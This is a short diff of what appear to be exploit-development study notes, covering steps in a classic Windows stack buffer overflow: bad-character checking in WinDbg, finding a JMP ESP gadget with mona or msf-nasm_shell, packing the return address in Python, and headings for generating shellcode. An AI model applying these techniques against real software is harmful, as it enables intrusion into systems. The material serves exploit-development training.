@@ -19,10 +19,7 @@
     2. `!py \\tsclient\local-share\srbx7_bads.py --address esp --bad 00 --start 01 --end 7f`
        1. Debug: `Debug: `db esp-8 L100`
 6. Redirecting execution flow
-    1. `JMP ESP` (TIP: if application compiled with `DEP`, `JMP ESP` address must be in the `.text`)
-        1. `msf-nasm_shell` > `jmp esp` > `FFE4`
-        2. Confirm the opcode at the address: `u 10090c83` > `ffe4`
-        3. Python: `eip = b"\x83\x0c\x09\x10"     #0x10090c83 - JMP ESP`
+    1.  `!py mona jmp -r esp -cpb '\x00'`: if lot of space (ex.: `inputBuffer += pack("<I",0x00418674) #00418674`)
 7. Generating shellcode
 8. Getting the shellcode
 9. Improving the exploit (not to crash the application)
